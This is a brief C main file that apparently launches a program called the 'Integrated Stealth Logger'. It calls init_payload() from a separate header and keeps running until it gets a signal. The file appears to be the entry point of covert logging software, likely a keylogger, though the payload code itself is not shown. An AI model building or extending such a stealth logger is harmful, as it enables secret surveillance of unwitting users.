#include "payload.h"
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

static void handle_signal(int sig) {
	printf("\nReceived signal %d, stopping payload...\n", sig);
	stop_payload();
	exit(0);
}

int main() {
	// Set up signal handlers
	signal(SIGINT, handle_signal);
	signal(SIGTERM, handle_signal);
	
	printf("Starting Integrated Stealth Logger...\n");
	init_payload();
	
	printf("Payload running in background. Press Ctrl+C to stop.\n");
	
	// Keep main thread alive
	while (1) {
		sleep(1);
	}
	
	return 0;
}